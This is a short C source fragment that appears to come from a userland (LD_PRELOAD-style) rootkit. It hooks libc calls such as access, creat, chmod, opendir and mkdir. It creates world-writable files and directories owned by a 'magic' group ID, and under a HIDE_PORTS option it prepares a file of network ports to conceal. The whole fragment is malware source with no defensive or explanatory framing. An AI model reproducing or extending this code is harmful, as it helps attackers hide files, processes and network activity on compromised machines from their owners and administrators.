int prepareregfile(const char *path, gid_t magicgid){
    hook(CACCESS, CCHMOD, CCREAT);
    int acc = (long)call(CACCESS, path, F_OK);
    if(acc != 0){
        int crt = (long)call(CCREAT, path, 0777);
        if(crt < 0) return -1;
        close(crt);

        if(chown_path(path, magicgid) < 0)
            return -1;

        if((long)call(CCHMOD, path, 0777) < 0)
            return -1;
    }
    return 1;
}

int preparedir(const char *path, gid_t magicgid){
    DIR *dp;
    hook(COPENDIR, CMKDIR, CCHMOD);
    dp = call(COPENDIR, path);
    if(dp != NULL){
        closedir(dp);
        return 1;
    }

    if((long)call(CMKDIR, path, 0777) < 0)
        return -1;

    if(chown_path(path, magicgid) < 0)
        return -1;

    if((long)call(CCHMOD, path, 0777) < 0)
        return -1;

    return 1;
}


#ifdef HIDE_PORTS
void prepareports(void){
    int hpa;
    hook(CACCESS);
    hpa = (long)call(CACCESS, HIDEPORTS, F_OK);
    if(hpa != 0) prepareregfile(HIDEPORTS, readgid());
}
#endif